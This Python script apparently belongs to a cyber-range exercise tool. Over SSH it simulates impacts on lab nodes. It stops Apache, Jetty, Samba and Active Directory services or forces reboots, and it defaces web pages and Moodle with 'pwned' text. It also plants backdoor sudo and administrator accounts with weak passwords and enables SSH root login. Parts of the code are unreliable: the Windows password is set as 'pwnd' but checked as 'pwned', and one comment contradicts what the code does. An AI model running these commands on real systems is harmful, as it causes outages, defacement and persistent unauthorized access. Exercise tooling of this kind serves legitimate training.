#!/usr/bin/env python3

from shell_handler import ShellHandler
import paramiko
import socket
import time

# Verbose output flag
verbose = False


#
# impact_availability - Simulate an availability-related impact on a node.
#
# parameters:
#         node -- Dictionary containing details about the target node.
#
# returns: Dictionary with command, output, success, and any error.
#
def impact_availability(node: dict) -> dict:
    print(f"[impact_availability] Impacting availability of node: {node['name']}")
    control_ip = node['addresses'][0]['addr']
    user = 'ubuntu' if 'linux' in node['roles'] else 'administrator'
    password = node.get('password')

    result = {
        "cmd": None,
        "stdout": None,
        "stderr": None,
        "exit_status": -1,
        "success": False,
        "error": None,
        "verified": False
    }

    cmd = ""
    expected_str = ""
    should_shutdown = False

    if 'sp' in node['roles']:
        cmd = "sudo systemctl stop apache2 && sudo systemctl status apache2"
        expected_str = "Active: inactive"
    elif 'idp' in node['roles']:
        cmd = "sudo systemctl stop jetty9 && sudo systemctl status jetty9"
        expected_str = "Active: inactive"
    elif 'domain_controller' in node['roles'] or 'domain_controller_leader' in node['roles']:
        cmd = "Stop-Service -Name NTDS; Get-Service -Name NTDS"
        expected_str = "Stopped"
    elif 'fs' in node['roles']:
        cmd = "sudo systemctl stop smbd && sudo systemctl status smbd"
        expected_str = "Active: inactive"
    elif 'linux' in node['roles']:
        cmd = "sudo shutdown -r now"
        expected_str = ""
        should_shutdown = True
    elif 'windows' in node['roles']:
        cmd = "Restart-Computer -Force"
        expected_str = ""
        should_shutdown = True
    else:
        msg = f"No supported role for availability impact on {node['name']}"
        print(f"[impact_availability] {msg}")
        result["error"] = msg
        return result

    result["cmd"] = cmd

    try:
        shell = ShellHandler(control_ip, user, password, verbose=verbose)
        stdout, stderr, exit_status = shell.execute_cmd(cmd)

        result["stdout"] = stdout
        result["stderr"] = stderr
        result["exit_status"] = exit_status
        verified = expected_str in stdout or expected_str in stderr if expected_str else True
        result["verified"] = verified

        if should_shutdown:
            time.sleep(10)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            try:
                sock.connect((control_ip, 22))
                sock.close()
                result["error"] = "Node still responds to SSH after shutdown command."
                result["success"] = False
                result["verified"] = False
            except (socket.timeout, ConnectionRefusedError, OSError):
                result["success"] = exit_status == 0 and verified
            finally:
                sock.close()
        else:
            result["success"] = exit_status == 0 and verified

        if not result["success"] and result["error"] is None:
            result["error"] = "Command failed or output verification failed."

    except paramiko.SSHException as e:
        result["error"] = str(e)

    return result


#
# impact_integrity - Simulate an integrity-related impact on a node.
# This function applies different integrity modifications depending on the node's role:
# - SP: modifies secure/index.html and Moodle text across all domains
# - IDP: overrides login message in Shibboleth message properties
# - Linux (non-SP/IDP): adds a '[pwned]' prefix to the shell prompt via .bashrc
# - Other roles: reports that no integrity impact is defined
#
# parameters:
#         node -- Dictionary containing details about the target node.
#
# returns: Dictionary with command, output, success, and any error.
#
def impact_integrity(node: dict) -> dict:
    print(f"[impact_integrity] Impacting integrity of node: {node['name']}")
    control_ip = node['addresses'][0]['addr']

    result = {
        "cmd": None,
        "stdout": None,
        "stderr": None,
        "exit_status": -1,
        "success": False,
        "error": None,
        "verified": False
    }

    try:
        shell = ShellHandler(control_ip, 'ubuntu', None, verbose=verbose)

        if 'sp' in node['roles']:
            # SP: Modify static secure page and Moodle installation for all domains
            cmd = """
            bash << 'OUTER'
              cat << 'EOF' | sudo tee /opt/integrity-impact-sp.sh > /dev/null
                  #!/bin/bash
                  set -x
                  echo "[impact_integrity] modifying secure page and moodle"
                  for path in /var/www/html/service.*
                  do
                      sudo sed -i 's|This is an example paragraph for a secure directory.*|<p>This site has been modified. You may have been pwned. [integrity tag]</p>|' "$path/secure/index.html"
                      sudo -u www-data php "$path/moodle/admin/tool/replace/cli/replace.php" \
                              --search='Moody' --replace='Pwned' --non-interactive
                  done
                  echo "[impact_integrity] complete"
              EOF
              sudo chmod +x /opt/integrity-impact-sp.sh
              sudo /opt/integrity-impact-sp.sh | sudo tee -a /var/log/integrity-impact-sp.log
            OUTER
            """
            verify_tag = "[impact_integrity] complete"

        elif 'idp' in node['roles']:
            # IDP: Override login message in message properties file
            cmd = """
            bash << 'OUTER'
              cat << 'EOF' | sudo tee /opt/integrity-impact-idp.sh > /dev/null
                  #!/bin/bash
                  set -x
                  echo "[impact_integrity] modifying Shibboleth IDP message properties"
                  prop_file="/opt/shibboleth-idp/messages/messages.properties"
                  if ! grep -q '^idp.login.forgotPassword=' "$prop_file"; then
                      echo "idp.login.forgotPassword=You've been pwned" | sudo tee -a "$prop_file"
                  fi
                  sudo rm -rf /opt/shibboleth-idp/data/tmp/*
                  sudo systemctl restart jetty apache2
                  echo "[impact_integrity] complete"
              EOF
              sudo chmod +x /opt/integrity-impact-idp.sh
              sudo /opt/integrity-impact-idp.sh | sudo tee -a /var/log/integrity-impact-idp.log
            OUTER
            """
            verify_tag = "[impact_integrity] complete"

        elif 'linux' in node['roles']:
            # Linux fallback: Alter the .bashrc prompt to indicate compromise
            cmd = """
            bash << 'OUTER'
              cat << 'EOF' | sudo tee /opt/integrity-impact-linux.sh > /dev/null
                  #!/bin/bash
                  set -x
                  echo "[impact_integrity] modifying .bashrc to include pwned prompt"
                  if ! grep -q "pwned" ~/.bashrc; then
                      echo 'export PS1="[pwned] \\u@\\h:\\w\\$ "' >> ~/.bashrc
                  fi
                  echo "[pwned prompt injected]"
              EOF
              sudo chmod +x /opt/integrity-impact-linux.sh
              sudo /opt/integrity-impact-linux.sh | sudo tee -a /var/log/integrity-impact-linux.log
            OUTER
            """
            verify_tag = "[pwned prompt injected]"

        else:
            # Unhandled role
            result["error"] = f"No integrity impact defined for node roles: {node['roles']}"
            return result

        # Execute command and evaluate output
        stdout, stderr, exit_status = shell.execute_cmd(cmd)

        result["cmd"] = cmd
        result["stdout"] = stdout
        result["stderr"] = stderr
        result["exit_status"] = exit_status
        result["verified"] = verify_tag.lower() in (stdout + stderr).lower()
        result["success"] = exit_status == 0 and result["verified"]

        if not result["success"]:
            result["error"] = "One or more commands failed or verification tag not found."

    except paramiko.SSHException as e:
        result["error"] = str(e)

    return result


#
# impact_confidentiality - Simulate a confidentiality-related impact on a node.
# This enables root login via SSH and sets the root password to 'pwned' on Linux,
# or creates a backdoor administrator account on Windows.
#
# parameters:
#         node -- Dictionary containing details about the target node.
#
# returns: Dictionary with command, output, success, and any error.
#
def impact_confidentiality(node: dict) -> dict:
    print(f"[impact_confidentiality] Impacting confidentiality of node: {node['name']}")
    control_ip = node['addresses'][0]['addr']

    result = {
        "cmd": None,
        "stdout": None,
        "stderr": None,
        "exit_status": -1,
        "success": False,
        "error": None,
        "verified": False
    }

    try:
        user = 'ubuntu' if 'linux' in node['roles'] else 'administrator'
        password = None if 'linux' in node['roles'] else node['password']
        shell = ShellHandler(control_ip, user, password, verbose=verbose)

        if 'windows' in node['roles']:
            cmd = """
            $username = 'impactadmin';
            $password = ConvertTo-SecureString 'pwnd' -AsPlainText -Force;
            if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
                New-LocalUser -Name $username -Password $password -FullName 'Impact Admin' -Description 'Backdoor admin account'
            };
            Add-LocalGroupMember -Group 'Administrators' -Member $username;
            Write-Output '[confidentiality access enabled]'
            """
            verify_tag = "[confidentiality access enabled]"
            stdout, stderr, exit_status = shell.execute_powershell(cmd)
            result["verified"] = exit_status == 0 and verify_tag.lower() in (stdout + stderr).lower()
        elif 'linux' in node['roles']:
            cmd = """
            bash << 'OUTER'
              cat << 'EOF' | sudo tee /opt/confidentiality-impact-linux.sh > /dev/null
                  #!/bin/bash
                  set -x
                  echo "[impact_confidentiality] creating impactroot user and enabling SSH access"
                  if ! id impactroot &>/dev/null; then
                      sudo useradd -m impactroot
                  fi
                  echo 'impactroot:pwned' | sudo chpasswd
                  sudo usermod -aG sudo impactroot
                  sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
                  sudo systemctl restart ssh
                  echo "[confidentiality access enabled]"
              EOF
              sudo chmod +x /opt/confidentiality-impact-linux.sh
              sudo /opt/confidentiality-impact-linux.sh | sudo tee -a /var/log/confidentiality-impact-linux.log
            OUTER
            """
            verify_tag = "[confidentiality access enabled]"
            stdout, stderr, exit_status = shell.execute_cmd(cmd)

            # Linux verification: try logging in as impactroot
            result["verified"] = exit_status == 0 and verify_tag.lower() in (stdout + stderr).lower()
    except paramiko.SSHException as e:
        result["error"] = str(e)
        return result

    if not result['verified']:
        return result

    try:

        if 'windows' in node['roles'] and result['verified']:
            impact_shell = ShellHandler(control_ip, 'impactadmin', 'pwned', verbose=verbose)
            cmd = """
if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Output 'impactadmin has administrative privileges.'
} else {
    Write-Output 'impactadmin does NOT have administrative privileges.'
}
"""
            check_out, check_err, check_code = impact_shell.execute_powershell(cmd)
            result["verified"] = check_code == 0 and "administrative privileges" in check_out
        elif 'linux' in node['roles'] and result['verified']:
            impact_shell = ShellHandler(control_ip, 'impactroot', 'pwned', verbose=verbose)
            check_out, check_err, check_code = impact_shell.execute_cmd("sudo cat /etc/passwd")
            result["verified"] = check_code == 0 and check_out.strip() != ""
        else:
            result["error"] = f"No confidentiality impact defined for node roles: {node['roles']}"
            return result
    except paramiko.SSHException as e:
        result["error"] = str(e)
        return result

    result["cmd"] = cmd
    result["stdout"] = stdout
    result["stderr"] = stderr
    result["exit_status"] = exit_status
    result["success"] = exit_status == 0 and result["verified"]

    if not result["success"] and result["error"] is None:
        result["error"] = "One or more commands failed or verification tag not found."

    return result
